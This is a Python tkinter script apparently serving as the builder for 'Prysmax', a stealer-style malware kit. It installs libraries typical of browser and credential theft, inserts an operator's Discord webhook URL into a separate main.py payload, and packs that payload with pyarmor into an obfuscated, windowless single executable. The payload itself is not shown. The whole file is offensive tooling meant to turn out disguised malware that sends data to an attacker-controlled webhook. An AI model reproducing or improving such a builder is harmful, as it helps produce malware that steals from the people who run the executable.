import os
import subprocess
import tkinter as tk
from tkinter import messagebox, filedialog

def download_libraries():
    required_libraries = [
        'requests', 'json', 'base64', 'sqlite3', 'shutil', 'uuid', 'wmi', 'psutil',
        'subprocess', 'pyarmor==7.6.1', 'pyinstaller==4.8', 'glob', 're', 'platform', 'Pillow', 
        'zipfile', 'discord-webhook', 'pycryptodomex', 'pycryptodome', 'datetime', 'pywin32',
    ]

    for library in required_libraries:
        try:
            __import__(library)
        except ImportError:
            print(f"{library} not found. Downloading...")
            subprocess.check_call(['pip', 'install', library])

def compile_and_explore(webhook_url):
    if not os.path.exists("prysmax1builder"):
        os.makedirs("prysmax1builder")

    main_content = ""
    with open("main.py", 'r', encoding='utf-8') as main_file:
        main_content = main_file.read()

    # Replace the placeholder with the user-provided webhook URL
    main_content = main_content.replace('theapi2023 = "Here-Token"', f'theapi2023 = "{webhook_url}"')

    file_path = os.path.join("prysmax1builder", "main.py")
    with open(file_path, 'w', encoding='utf-8') as new_main_file:
        new_main_file.write(main_content)

    here = messagebox.askyesno("Confirm Compilation", "Are you sure you want to compile your file to Executable?")
    if here:
        print("Compiling...")
        try:
            subprocess.run('pyarmor pack -e "--onefile --noconsole --icon=NONE" prysmax1builder\\main.py', shell=True)
        except:
            subprocess.run('pyarmor-7 pack -e"--onefile --noconsole --icon=NONE" prysmax1builder\\main.py', shell=True)

        print("File successfully compiled!")
        subprocess.run("explorer prysmax1builder\\dist", shell=True)
    else:
        print("Compilation canceled.")

def main():
    def on_download_libraries():
        download_libraries()
        messagebox.showinfo("Info", "Libraries downloaded successfully!")

    def on_compile_and_explore():
        webhook_url = webhook_url_entry.get()
        compile_and_explore(webhook_url)

    root = tk.Tk()
    root.title("Prysmax Builder")
    root.geometry("500x400")
    root.configure(bg='#1e1e1e')

    # Add a background image
    background_image = tk.PhotoImage(file="background.png")
    background_label = tk.Label(root, image=background_image)
    background_label.place(relwidth=1, relheight=1)

    # Container frame with padding and rounded borders
    container = tk.Frame(root, bg='#333333', bd=2, relief='groove')
    container.place(relx=0.5, rely=0.5, anchor='center', width=400, height=300)

    title_label = tk.Label(container, text="Prysmax Builder", font=('Helvetica', 24), fg='#00ff00', bg='#333333')
    title_label.pack(pady=20)

    webhook_label = tk.Label(container, text="Enter your Discord Webhook URL:", font=('Helvetica', 12), fg='white', bg='#333333')
    webhook_label.pack(pady=10)
    webhook_url_entry = tk.Entry(container, font=('Helvetica', 12), width=40)
    webhook_url_entry.pack(pady=5)

    button_frame = tk.Frame(container, bg='#333333')
    button_frame.pack(pady=20)

    download_button = tk.Button(button_frame, text="Download Libraries", font=('Helvetica', 12), bg='#555555', fg='white', command=on_download_libraries)
    download_button.grid(row=0, column=0, padx=10)

    compile_button = tk.Button(button_frame, text="Compile and Explore", font=('Helvetica', 12), bg='#555555', fg='white', command=on_compile_and_explore)
    compile_button.grid(row=0, column=1, padx=10)

    exit_button = tk.Button(container, text="Exit", font=('Helvetica', 12), bg='#ff5555', fg='white', command=root.quit)
    exit_button.pack(pady=10)

    root.mainloop()

if __name__ == '__main__':
    main()
